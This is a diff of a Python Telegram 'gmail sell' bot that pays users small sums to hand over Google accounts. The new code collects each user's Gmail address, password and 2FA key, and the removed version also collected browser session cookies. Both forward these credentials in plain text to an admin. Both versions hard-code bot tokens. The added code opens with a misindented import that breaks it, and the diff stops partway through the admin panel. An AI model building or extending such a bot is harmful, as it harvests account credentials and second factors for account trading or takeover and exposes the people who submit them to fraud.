@@ -1,606 +1,443 @@
-import telebot
-from telebot import types
-import json
-import os
-import time
-import threading
-from flask import Flask
+    import logging
+from telegram import (
+    Update,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+    ReplyKeyboardMarkup,
+    KeyboardButton
+)
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    MessageHandler,
+    CallbackQueryHandler,
+    ConversationHandler,
+    ContextTypes,
+    filters
+)
 
-# ==================== CONFIGURATION ====================
-BOT_TOKEN = "8995026167:AAEOm3-eBmGW-xVbNGgogLd594iPfPCuFsQ"  # Insert Telegram Bot Token from @BotFather
-ADMIN_ID = 6112720850  # Insert your numeric Telegram User ID
-REQUIRED_CHANNEL = "@googlejobhubsudeb"  # Must include '@', e.g., @MyRentalChannel
-TUTORIAL_URL = "https://t.me/googlejobhubsudeb/3415"  # Link to video or tutorial channel
+# ----------------- CONFIGURATION -----------------
+BOT_TOKEN = "8710136196:AAFX9LodA6fadXsph4n04wt1Zv6r7ln1mlQ"          # Change this to your BotFather token
+ADMIN_ID =   6112720850                         # Change this to your Telegram Numeric ID
+REQUIRED_CHANNEL = "@googlejobhubsudeb"      # Change this to your Channel username (with @)
+TUTORIAL_VIDEO_URL = "https://t.me/googlejobhubsudeb/3415"  # Change this to your Tutorial video link
 
-bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
+# Setup logging
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO
+)
 
-# ==================== RENDER KEEP-ALIVE SERVER ====================
-# Prevents "No open ports detected" error on Render Web Services
-app = Flask('')
+# ----------------- DATABASE (In-Memory) -----------------
+users_db = {}
+tasks_db = {}
+task_counter = 1000
 
-@app.route('/')
-def home():
-    return "Bot is running online 24/7!"
+# Conversation States
+GMAIL, PASSWORD, TWO_FA = range(3)
+USDT_AMOUNT, USDT_ADDRESS = range(3, 5)
+BC_MSG, BC_IMG = range(5, 7)
 
-def run_web_server():
-    port = int(os.environ.get("PORT", 8080))
-    app.run(host='0.0.0.0', port=port)
+# ----------------- KEYBOARDS -----------------
+MAIN_MENU = ReplyKeyboardMarkup([
+    [KeyboardButton("𝟭) 𝗧𝗮𝘀𝗸"), KeyboardButton("𝟮) 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗵𝗶𝘀𝘁𝗼𝗿𝘆")],
+    [KeyboardButton("𝟯) 𝗕𝗮𝗹𝗮𝗻𝗰𝗲"), KeyboardButton("𝟰) 𝗪𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹")],
+    [KeyboardButton("𝟱) 𝗦𝘂𝗽𝗽𝗼𝗿𝘁")]
+], resize_keyboard=True)
 
-def keep_alive():
-    t = Threading_Thread = threading.Thread(target=run_web_server, daemon=True)
-    Threading_Thread.start()
+def get_sub_keyboard():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ✅", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")],
+        [InlineKeyboardButton("𝗖𝗵𝗲𝗰𝗸 𝗝𝗼𝗶𝗻𝗲𝗱 🔄", callback_data="check_join")]
+    ])
 
-keep_alive()
-
-# ==================== DATABASE SYSTEM ====================
-DATA_FILE = "database.json"
-
-def load_data():
-    if os.path.exists(DATA_FILE):
-        try:
-            with open(DATA_FILE, "r") as f:
-                return json.load(f)
-        except Exception:
-            pass
-    return {"users": {}, "tasks": {}, "counter": 1000}
-
-def save_data(data):
-    with open(DATA_FILE, "w") as f:
-        json.dump(data, f, indent=4)
-
-db = load_data()
-
-def get_user(user_id):
-    str_id = str(user_id)
-    if str_id not in db["users"]:
-        db["users"][str_id] = {
-            "balance": 0.0,
-            "upi": "Not Set",
-            "usdt": "Not Set",
-            "tasks": []
-        }
-        save_data(db)
-    return db["users"][str_id]
-
-# User States for multi-step inputs
-user_states = {}
-
-# ==================== BACKGROUND 6-HOUR ALARM THREAD ====================
-def start_reminder_alarm():
-    """Background worker that alerts Admin if an Active task hasn't had balance updated in 6 hours."""
-    while True:
-        try:
-            current_time = time.time()
-            six_hours_sec = 6 * 3600  # 21,600 seconds
-            
-            for tid, t_data in list(db["tasks"].items()):
-                if t_data.get("status") == "Active":
-                    last_update = t_data.get("last_updated", current_time)
-                    last_alert = t_data.get("last_alert_sent", 0)
-                    
-                    if (current_time - last_update >= six_hours_sec) and (current_time - last_alert >= six_hours_sec):
-                        alarm_msg = (
-                            f"⏰ <b>INACTIVITY ALARM REMINDER!</b>\n"
-                            f"━━━━━━━━━━━━━━━━━━━\n"
-                            f"🆔 <b>Task ID:</b> <code>{tid}</code>\n"
-                            f"📧 <b>Gmail:</b> <code>{t_data.get('gmail')}</code>\n"
-                            f"⚠️ <b>Status:</b> Active (No balance update for over 6 hours!)\n"
-                            f"━━━━━━━━━━━━━━━━━━━\n"
-                            f"<i>Use <code>/add_task_bal {tid} AMOUNT</code> to update balance.</i>"
-                        )
-                        try:
-                            bot.send_message(ADMIN_ID, alarm_msg)
-                            db["tasks"][tid]["last_alert_sent"] = current_time
-                            save_data(db)
-                        except Exception as e:
-                            print(f"Error sending alarm: {e}")
-                            
-        except Exception as e:
-            print(f"Error in alarm thread: {e}")
-            
-        time.sleep(600)  # Check every 10 minutes
-
-alarm_thread = threading.Thread(target=start_reminder_alarm, daemon=True)
-alarm_thread.start()
-
-# ==================== HELPER FUNCTIONS & MIDDLEWARE ====================
-def is_subscribed(user_id):
+# ----------------- HELPER FUNCTIONS -----------------
+async def is_subscribed(bot, user_id):
     try:
-        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
-        return member.status in ['creator', 'administrator', 'member']
+        member = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
+        return member.status in ["member", "administrator", "creator"]
     except Exception:
-        return True
+        return False
 
-def check_channel_middleware(func):
-    def wrapper(message):
-        user_id = message.from_user.id
-        if not is_subscribed(user_id):
-            markup = types.InlineKeyboardMarkup()
-            markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}"))
-            markup.add(types.InlineKeyboardButton("✅ Joined / Verify", callback_data="verify_join"))
-            bot.send_message(
-                message.chat.id,
-                "⚠️ <b>Access Denied!</b>\n\nYou must join our official channel to use this bot.",
-                reply_markup=markup
-            )
-            return
-        return func(message)
-    return wrapper
+def init_user(user_id):
+    if user_id not in users_db:
+        users_db[user_id] = {"balance": 0.0, "tasks": []}
 
-# ==================== KEYBOARDS ====================
-def main_menu():
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.row("🤝 Rent Gmail", "📊 Account & Balance")
-    markup.row("💳 Withdrawal", "⚙️ Wallet Settings")
-    markup.row("📖 Tutorial", "🎧 Support")
-    return markup
-
-# ==================== START & VERIFY ====================
-@bot.message_handler(commands=['start'])
-def start_cmd(message):
-    get_user(message.from_user.id)
-    if not is_subscribed(message.from_user.id):
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}"))
-        markup.add(types.InlineKeyboardButton("✅ Joined / Verify", callback_data="verify_join"))
-        bot.send_message(
-            message.chat.id,
-            "⚠️ <b>Access Denied!</b>\n\nYou must join our official channel to access the bot.",
-            reply_markup=markup
+# ----------------- START & VERIFICATION -----------------
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    init_user(user_id)
+    
+    if not await is_subscribed(context.bot, user_id):
+        await update.message.reply_text(
+            "⚠️ 𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!",
+            reply_markup=get_sub_keyboard()
         )
         return
 
-    welcome_txt = (
-        "<b>Welcome To our Rental Bot</b> 😊\n"
-        "You Can Earn Money By Renting Gmail 🤝\n\n"
-        "💰 <b>For 1st time Gmail Rent initially Earn:</b> ₹10-15 / $0.10-0.15\n\n"
-        "Use the menu options below to navigate!"
+    welcome_text = (
+        "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗼𝘂𝗿 𝗴𝗺𝗮𝗶𝗹 𝘀𝗲𝗹𝗹 𝗯𝗼𝘁 🤑🤑\n\n"
+        "𝗘𝗮𝗿𝗻 𝗲𝘃𝗲𝗿𝘆 𝗴𝗺𝗮𝗶𝗹 𝟎.𝟑𝟐$ 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅️\n"
+        "𝟏 𝗬𝗲𝗮𝗿 𝗼𝗹𝗱 𝗴𝗺𝗮𝗶𝗹 𝗴𝗲𝘁 𝟎.𝟑𝟕$ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅️"
     )
-    bot.send_message(message.chat.id, welcome_txt, reply_markup=main_menu())
+    tutorial_btn = InlineKeyboardMarkup([
+        [InlineKeyboardButton("𝗖𝗹𝗶𝗰𝗸 𝗵𝗲𝗿𝗲 𝘁𝗼 𝗴𝗲𝘁 𝘁𝘂𝘁𝗼𝗿𝗶𝗮𝗹 🎥", url=TUTORIAL_VIDEO_URL)]
+    ])
+    
+    await update.message.reply_text(welcome_text, reply_markup=tutorial_btn)
+    await update.message.reply_text("𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻 𝗳𝗿𝗼𝗺 𝗯𝗲𝗹𝗼𝘄 𝗺𝗲𝗻𝘂:", reply_markup=MAIN_MENU)
 
-@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
-def verify_join_callback(call):
-    if is_subscribed(call.from_user.id):
-        bot.answer_callback_query(call.id, "✅ Verified successfully!")
-        bot.delete_message(call.message.chat.id, call.message.message_id)
-        start_cmd(call.message)
+async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+    
+    if await is_subscribed(context.bot, user_id):
+        await query.message.delete()
+        welcome_text = (
+            "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗼𝘂𝗿 𝗴𝗺𝗮𝗶𝗹 𝘀𝗲𝗹𝗹 𝗯𝗼𝘁 🤑🤑\n\n"
+            "𝗘𝗮𝗿𝗻 𝗲𝘃𝗲𝗿𝘆 𝗴𝗺𝗮𝗶𝗹 𝟎.𝟑𝟐$ 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅️\n"
+            "𝟏 𝗬𝗲𝗮𝗿 𝗼𝗹𝗱 𝗴𝗺𝗮𝗶𝗹 𝗴𝗲𝘁 𝟎.𝟑𝟕$ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅️"
+        )
+        tutorial_btn = InlineKeyboardMarkup([
+            [InlineKeyboardButton("𝗖𝗹𝗶𝗰𝗸 𝗵𝗲𝗿𝗲 𝘁𝗼 𝗴𝗲𝘁 𝘁𝘂𝘁𝗼𝗿𝗶𝗮𝗹 🎥", url=TUTORIAL_VIDEO_URL)]
+        ])
+        await query.message.reply_text(welcome_text, reply_markup=tutorial_btn)
+        await query.message.reply_text("𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻 𝗳𝗿𝗼𝗺 𝗯𝗲𝗹𝗼𝘄 𝗺𝗲𝗻𝘂:", reply_markup=MAIN_MENU)
     else:
-        bot.answer_callback_query(call.id, "❌ You haven't joined yet!", show_alert=True)
+        await query.message.reply_text("❌ 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗻𝗼𝘁 𝗷𝗼𝗶𝗻𝗲𝗱 𝘆𝗲𝘁! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗷𝗼𝗶𝗻 𝗳𝗶𝗿𝘀𝘁.", reply_markup=get_sub_keyboard())
 
-# ==================== RENTAL TUTORIAL ====================
-@bot.message_handler(func=lambda msg: msg.text == "📖 Tutorial")
-@check_channel_middleware
-def tutorial_handler(message):
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("🎥 Watch Tutorial Video", url=TUTORIAL_URL))
+# ----------------- TASK FLOW -----------------
+async def start_task(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not await is_subscribed(context.bot, user_id):
+        await update.message.reply_text("⚠️ 𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗶𝗿𝘀𝘁!", reply_markup=get_sub_keyboard())
+        return ConversationHandler.END
+
+    await update.message.reply_text("✉️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗚𝗺𝗮𝗶𝗹 𝗮𝗱𝗱𝗿𝗲𝘀𝘀:")
+    return GMAIL
+
+async def get_task_gmail(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data["gmail"] = update.message.text.strip()
+    await update.message.reply_text("🔑 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗚𝗺𝗮𝗶𝗹 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱:")
+    return PASSWORD
+
+async def get_task_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data["password"] = update.message.text.strip()
     
-    txt = (
-        "<b>📘 How To Rent Gmail Tutorial</b>\n\n"
-        "1. Click on <b>🤝 Rent Gmail</b>\n"
-        "2. Submit your Gmail Address\n"
-        "3. Enter the Password accurately\n"
-        "4. Paste valid browser Cookies (Netscape/JSON format)\n"
-        "5. Submit for Admin verification.\n\n"
-        "Once verified, your task will be set to <b>Active</b> and earnings added directly to your account!"
-    )
-    bot.send_message(message.chat.id, txt, reply_markup=markup)
+    two_fa_btn = InlineKeyboardMarkup([
+        [InlineKeyboardButton("𝗛𝗼𝘄 𝘁𝗼 𝘀𝗲𝘁 𝟮𝗙𝗔 ❓", url=TUTORIAL_VIDEO_URL)]
+    ])
+    await update.message.reply_text("🛡️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗚𝗺𝗮𝗶𝗹 𝟮𝗙𝗔 𝗸𝗲𝘆:", reply_markup=two_fa_btn)
+    return TWO_FA
 
-# ==================== RENTAL SUBMISSION FORM ====================
-@bot.message_handler(func=lambda msg: msg.text == "🤝 Rent Gmail")
-@check_channel_middleware
-def rent_gmail_start(message):
-    user_states[message.from_user.id] = {"step": "GMAIL"}
-    msg = bot.send_message(
-        message.chat.id,
-        "<b>Step 1/3:</b>\n\nPlease enter your <b>Gmail Address</b>:",
-        reply_markup=types.ReplyKeyboardRemove()
-    )
-    bot.register_next_step_handler(msg, process_gmail)
+async def get_task_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global task_counter
+    user_id = update.effective_user.id
+    two_fa = update.message.text.strip()
+    gmail = context.user_data["gmail"]
+    password = context.user_data["password"]
 
-def process_gmail(message):
-    user_id = message.from_user.id
-    if message.text == "/cancel":
-        user_states.pop(user_id, None)
-        bot.send_message(message.chat.id, "❌ Submission cancelled.", reply_markup=main_menu())
-        return
+    task_id = str(task_counter)
+    task_counter += 1
 
-    user_states[user_id]["gmail"] = message.text.strip()
-    user_states[user_id]["step"] = "PASSWORD"
-    
-    msg = bot.send_message(message.chat.id, "<b>Step 2/3:</b>\n\nPlease enter the <b>Password</b> for this account:")
-    bot.register_next_step_handler(msg, process_password)
-
-def process_password(message):
-    user_id = message.from_user.id
-    if message.text == "/cancel":
-        user_states.pop(user_id, None)
-        bot.send_message(message.chat.id, "❌ Submission cancelled.", reply_markup=main_menu())
-        return
-
-    user_states[user_id]["password"] = message.text.strip()
-    user_states[user_id]["step"] = "COOKIES"
-    
-    msg = bot.send_message(message.chat.id, "<b>Step 3/3:</b>\n\nPlease enter your <b>Cookies</b>:")
-    bot.register_next_step_handler(msg, process_cookies)
-
-def process_cookies(message):
-    user_id = message.from_user.id
-    if message.text == "/cancel":
-        user_states.pop(user_id, None)
-        bot.send_message(message.chat.id, "❌ Submission cancelled.", reply_markup=main_menu())
-        return
-
-    user_states[user_id]["cookies"] = message.text.strip()
-    
-    task_id = f"TSK{db['counter']}"
-    db["counter"] += 1
-
-    gmail = user_states[user_id]["gmail"]
-    pwd = user_states[user_id]["password"]
-    cookies = user_states[user_id]["cookies"]
-
-    db["tasks"][task_id] = {
-        "user_id": str(user_id),
+    tasks_db[task_id] = {
+        "user_id": user_id,
         "gmail": gmail,
-        "password": pwd,
-        "cookies": cookies,
-        "status": "Pending",
-        "earned": 0.0,
-        "last_updated": time.time(),
-        "last_alert_sent": 0
+        "pass": password,
+        "2fa": two_fa,
+        "status": "Pending"
     }
-    db["users"][str(user_id)]["tasks"].append(task_id)
-    save_data(db)
+    users_db[user_id]["tasks"].append(task_id)
 
-    user_states.pop(user_id, None)
-
-    bot.send_message(
-        message.chat.id,
-        "<b>Thanks for submitting!</b>\n\nOur admin will review and accept it as soon as possible.",
-        reply_markup=main_menu()
+    await update.message.reply_text(
+        f"✅ 𝗧𝗵𝗮𝗻𝗸𝘀 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝘀𝘂𝗯𝗺𝗶𝘀𝘀𝗶𝗼𝗻!\n\n"
+        f"🆔 𝗧𝗮𝘀𝗸 𝗜𝗗: `{task_id}`\n"
+        f"⏳ 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 𝗔𝗽𝗽𝗿𝗼𝘃𝗮𝗹",
+        parse_mode="Markdown"
     )
 
-    admin_markup = types.InlineKeyboardMarkup()
-    admin_markup.row(
-        types.InlineKeyboardButton("✅ Accept", callback_data=f"adm_acc_{task_id}"),
-        types.InlineKeyboardButton("❌ Reject", callback_data=f"adm_rej_{task_id}")
+    admin_markup = InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("✅ 𝗔𝗰𝗰𝗲𝗽𝘁", callback_data=f"adm_accept_{task_id}"),
+            InlineKeyboardButton("❌ 𝗥𝗲𝗷𝗲𝗰𝘁", callback_data=f"adm_reject_{task_id}")
+        ]
+    ])
+    admin_msg = (
+        f"📥 𝗡𝗲𝘄 𝗧𝗮𝘀𝗸 𝗦𝘂𝗯𝗺𝗶𝘀𝘀𝗶𝗼𝗻\n\n"
+        f"🆔 𝗧𝗮𝘀𝗸 𝗜𝗗: `{task_id}`\n"
+        f"👤 𝗨𝘀𝗲𝗿 𝗜𝗗: `{user_id}`\n"
+        f"✉️ 𝗚𝗺𝗮𝗶𝗹: `{gmail}`\n"
+        f"🔑 𝗣𝗮𝘀𝘀: `{password}`\n"
+        f"🛡️ 𝟮𝗙𝗔: `{two_fa}`"
     )
+    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown", reply_markup=admin_markup)
+    return ConversationHandler.END
 
-    admin_txt = (
-        f"📥 <b>NEW RENTAL SUBMISSION</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
-        f"🆔 <b>Task ID:</b> <code>{task_id}</code>\n"
-        f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
-        f"📧 <b>Gmail:</b> <code>{gmail}</code>\n"
-        f"🔑 <b>Password:</b> <code>{pwd}</code>\n"
-        f"🍪 <b>Cookies:</b>\n<code>{cookies}</code>\n"
-        f"━━━━━━━━━━━━━━━━━━━"
-    )
-    bot.send_message(ADMIN_ID, admin_txt, reply_markup=admin_markup)
+# ----------------- ADMIN ACTIONS -----------------
+async def admin_task_actions(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
 
-# ==================== ACCOUNT & BALANCE HISTORY ====================
-@bot.message_handler(func=lambda msg: msg.text == "📊 Account & Balance")
-@check_channel_middleware
-def account_dashboard(message):
-    user_id = str(message.from_user.id)
-    user_info = get_user(user_id)
-    user_tasks = user_info.get("tasks", [])
-    
-    active_count = 0
-    deactive_count = 0
-    task_history_text = ""
+    if data.startswith("adm_accept_"):
+        task_id = data.replace("adm_accept_", "")
+        rates_markup = InlineKeyboardMarkup([
+            [
+                InlineKeyboardButton("➕ $𝟬.𝟯𝟮", callback_data=f"pay_0.32_{task_id}"),
+                InlineKeyboardButton("➕ $𝟬.𝟯𝟳", callback_data=f"pay_0.37_{task_id}")
+            ]
+        ])
+        await query.message.edit_text(
+            f"{query.message.text}\n\n👉 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗺𝗼𝘂𝗻𝘁 𝘁𝗼 𝗰𝗿𝗲𝗱𝗶𝘁 𝘂𝘀𝗲𝗿:",
+            reply_markup=rates_markup,
+            parse_mode="Markdown"
+        )
 
-    if not user_tasks:
-        task_history_text = "<i>No rental tasks submitted yet.</i>\n"
-    else:
-        for tid in user_tasks:
-            t = db["tasks"].get(tid)
-            if not t:
-                continue
-            status = t["status"]
-            if status == "Active":
-                active_count += 1
-                status_icon = "🟢 Active"
-            elif status == "Offline":
-                deactive_count += 1
-                status_icon = "🔴 Offline"
-            elif status == "Rejected":
-                status_icon = "❌ Rejected"
-            else:
-                status_icon = "⏳ Pending"
+    elif data.startswith("pay_"):
+        _, amount_str, task_id = data.split("_")
+        amount = float(amount_str)
+        task = tasks_db.get(task_id)
 
-            task_history_text += (
-                f"🔹 <b>Task ID:</b> <code>{tid}</code>\n"
-                f"   ├ Status: {status_icon}\n"
-                f"   └ Task Earned: ₹{t.get('earned', 0.0):.2f}\n"
+        if task and task["status"] == "Pending":
+            task["status"] = "Accepted"
+            user_id = task["user_id"]
+            users_db[user_id]["balance"] += amount
+            
+            await query.message.edit_text(
+                f"{query.message.text}\n\n✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝘄𝗶𝘁𝗵 ${amount}",
+                parse_mode="Markdown"
+            )
+            await context.bot.send_message(
+                chat_id=user_id,
+                text=f"🎉 𝗬𝗼𝘂𝗿 𝘁𝗮𝘀𝗸 #{task_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱!\n💰 ${amount} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 𝘆𝗼𝘂𝗿 𝗯𝗮𝗹𝗮𝗻𝗰𝗲."
             )
 
-    dashboard = (
-        f"👤 <b>ACCOUNT DASHBOARD</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
-        f"💰 <b>Total Available Balance:</b> ₹{user_info['balance']:.2f}\n\n"
-        f"📊 <b>Task Summary:</b>\n"
-        f"🟢 Active Tasks: {active_count}\n"
-        f"🔴 Offline/Deactive Tasks: {deactive_count}\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
-        f"📋 <b>TASK DETAILS & HISTORY</b>\n\n"
-        f"{task_history_text}"
-        f"━━━━━━━━━━━━━━━━━━━\n"
-        f"💳 <b>Saved UPI:</b> {user_info['upi']}\n"
-        f"🌐 <b>USDT (BEP20):</b> {user_info['usdt']}"
-    )
-    bot.send_message(message.chat.id, dashboard)
+    elif data.startswith("adm_reject_"):
+        task_id = data.replace("adm_reject_", "")
+        task = tasks_db.get(task_id)
 
-# ==================== WALLET SETTINGS ====================
-@bot.message_handler(func=lambda msg: msg.text == "⚙️ Wallet Settings")
-@check_channel_middleware
-def wallet_settings(message):
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("💎 Set UPI ID", callback_data="set_upi"))
-    markup.add(types.InlineKeyboardButton("⚡ Set USDT BEP20", callback_data="set_usdt"))
-    
-    bot.send_message(message.chat.id, "<b>Wallet Settings</b>\nChoose address type to configure:", reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda call: call.data in ["set_upi", "set_usdt"])
-def set_wallet_callback(call):
-    wtype = "UPI ID" if call.data == "set_upi" else "USDT (BEP20) Address"
-    msg = bot.send_message(call.message.chat.id, f"Please reply with your valid <b>{wtype}</b>:")
-    bot.register_next_step_handler(msg, save_wallet_address, call.data)
-
-def save_wallet_address(message, wtype):
-    user_id = str(message.from_user.id)
-    val = message.text.strip()
-    if wtype == "set_upi":
-        db["users"][user_id]["upi"] = val
-        bot.send_message(message.chat.id, f"✅ UPI ID updated to: <code>{val}</code>")
-    else:
-        db["users"][user_id]["usdt"] = val
-        bot.send_message(message.chat.id, f"✅ USDT BEP20 Address updated to: <code>{val}</code>")
-    save_data(db)
-
-# ==================== WITHDRAWAL SYSTEM ====================
-@bot.message_handler(func=lambda msg: msg.text == "💳 Withdrawal")
-@check_channel_middleware
-def withdrawal_start(message):
-    user_id = str(message.from_user.id)
-    user_info = get_user(user_id)
-    bal = user_info["balance"]
-
-    if bal < 30.0:
-        bot.send_message(
-            message.chat.id,
-            f"❌ <b>Insufficient Balance!</b>\n\n"
-            f"Minimum Withdrawal Amount is <b>₹30 / $0.30</b>.\n"
-            f"Your Current Balance: <b>₹{bal:.2f}</b>"
-        )
-        return
-
-    if user_info["upi"] == "Not Set" and user_info["usdt"] == "Not Set":
-        bot.send_message(
-            message.chat.id,
-            "⚠️ Please configure your UPI or USDT wallet address in <b>⚙️ Wallet Settings</b> before requesting a withdrawal."
-        )
-        return
-
-    msg = bot.send_message(
-        message.chat.id,
-        f"💰 Your Current Balance: <b>₹{bal:.2f}</b>\n\n"
-        f"Enter the manual amount you wish to withdraw (Minimum ₹30):"
-    )
-    bot.register_next_step_handler(msg, process_withdrawal, bal)
-
-def process_withdrawal(message, total_bal):
-    try:
-        amount = float(message.text.strip())
-        if amount < 30.0:
-            bot.send_message(message.chat.id, "❌ Minimum withdrawal amount is ₹30.")
-            return
-        if amount > total_bal:
-            bot.send_message(message.chat.id, "❌ Amount exceeds available balance.")
-            return
-
-        user_id = str(message.from_user.id)
-        db["users"][user_id]["balance"] -= amount
-        save_data(db)
-
-        u_info = db["users"][user_id]
-        bot.send_message(
-            ADMIN_ID,
-            f"💸 <b>NEW WITHDRAWAL REQUEST</b>\n\n"
-            f"👤 User: <code>{user_id}</code>\n"
-            f"💵 Amount: ₹{amount:.2f}\n"
-            f"💳 UPI: <code>{u_info['upi']}</code>\n"
-            f"🌐 USDT: <code>{u_info['usdt']}</code>"
-        )
-
-        bot.send_message(
-            message.chat.id,
-            f"✅ Withdrawal request of <b>₹{amount:.2f}</b> submitted successfully!\n"
-            f"Remaining Balance: <b>₹{db['users'][user_id]['balance']:.2f}</b>"
-        )
-
-    except ValueError:
-        bot.send_message(message.chat.id, "❌ Invalid amount format. Please enter numbers only.")
-
-# ==================== SUPPORT SYSTEM ====================
-@bot.message_handler(func=lambda msg: msg.text == "🎧 Support")
-@check_channel_middleware
-def support_handler(message):
-    msg = bot.send_message(
-        message.chat.id,
-        "📩 Type your message below. It will be sent directly to our support team:"
-    )
-    bot.register_next_step_handler(msg, send_support_to_admin)
-
-def send_support_to_admin(message):
-    bot.send_message(
-        ADMIN_ID,
-        f"🎧 <b>SUPPORT MESSAGE FROM USER</b>\n\n"
-        f"👤 User ID: <code>{message.from_user.id}</code>\n"
-        f"💬 Message:\n{message.text}\n\n"
-        f"<i>To reply, use command: /msg {message.from_user.id} Your_Message</i>"
-    )
-    bot.send_message(message.chat.id, "✅ Message delivered to support admin! We will reply shortly.")
-
-# ==================== ADMIN SYSTEM & COMMANDS ====================
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
-def admin_task_action(call):
-    if call.from_user.id != ADMIN_ID:
-        return
-
-    action, task_id = call.data.split("_")[1], call.data.split("_")[2]
-    task = db["tasks"].get(task_id)
-
-    if not task:
-        bot.answer_callback_query(call.id, "Task not found!")
-        return
-
-    user_id = task["user_id"]
-
-    if action == "acc":
-        task["status"] = "Active"
-        task["earned"] = 0.0  # ZERO AUTOMATIC BALANCE ADDED
-        task["last_updated"] = time.time()  # Starts the 6h inactivity timer
-        save_data(db)
-
-        bot.edit_message_text(f"✅ <b>Accepted Task:</b> {task_id}", call.message.chat.id, call.message.message_id)
-        bot.send_message(
-            user_id,
-            f"🎉 <b>Gmail Accepted!</b>\n\nYour task <code>{task_id}</code> is now active."
-        )
-    elif action == "rej":
-        task["status"] = "Rejected"
-        save_data(db)
-
-        bot.edit_message_text(f"❌ <b>Rejected Task:</b> {task_id}", call.message.chat.id, call.message.message_id)
-        bot.send_message(
-            user_id,
-            f"❌ <b>Task Rejected</b>\n\nYour submitted Gmail task <code>{task_id}</code> was not accepted."
-        )
-
-@bot.message_handler(commands=['admin'])
-def admin_panel(message):
-    if message.from_user.id != ADMIN_ID:
-        return
-
-    panel_text = (
-        "🛠 <b>ADMIN COMMAND CONTROL</b>\n\n"
-        "⚡ <b>Task Control:</b>\n"
-        "• <code>/task_active TASK_ID</code> - Set task to Active\n"
-        "• <code>/task_deactive TASK_ID</code> - Set task to Offline\n"
-        "• <code>/add_task_bal TASK_ID AMOUNT</code> - Add balance to specific task (Resets 6h Timer)\n"
-        "• <code>/rem_task_bal TASK_ID AMOUNT</code> - Deduct balance from task\n\n"
-        "💵 <b>User Whole Balance Control:</b>\n"
-        "• <code>/add_bal USER_ID AMOUNT</code> - Add whole user balance\n"
-        "• <code>/rem_bal USER_ID AMOUNT</code> - Deduct whole user balance\n"
